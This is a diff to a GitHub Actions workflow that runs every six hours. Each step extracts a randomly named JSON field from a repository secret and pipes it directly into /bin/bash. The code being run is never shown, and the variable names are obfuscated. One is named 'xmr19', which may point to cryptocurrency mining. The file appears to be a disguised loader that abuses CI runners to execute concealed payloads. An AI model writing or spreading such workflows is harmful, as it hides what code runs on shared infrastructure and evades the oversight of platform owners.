@@ -2,26 +2,18 @@ name: jianadadelvshi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '37 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jianadadelvshi
         env:
-          frjt23027: ${{ secrets.frjt23027 }}
+          rlrme0844: ${{ secrets.rlrme0844 }}
         run: |
-          echo $frjt23027 | jq -r .jzol26 | /bin/bash
-          echo $ik6 | jq -r .jflv07 | /bin/bash
-          echo $be03164 | jq -r .zla251 | /bin/bash
-          echo $qful32 | jq -r .c379 | /bin/bash
-          echo $gdhv82 | jq -r .v532 | /bin/bash
-          echo $mji2753 | jq -r .emxkm0212 | /bin/bash
-          echo $ct8 | jq -r .rzq7716 | /bin/bash
-          echo $etkt83676 | jq -r .qwz8922 | /bin/bash
-          echo $pyhlr21589 | jq -r .fv33 | /bin/bash
-          echo $w54 | jq -r .d4 | /bin/bash
-          echo $rhom6636 | jq -r .eztqw5077 | /bin/bash
+          echo $rlrme0844 | jq -r .mh3175 | /bin/bash
+          echo $j8 | jq -r .wq3 | /bin/bash
+          echo $xmr19 | jq -r .dq9 | /bin/bash
 
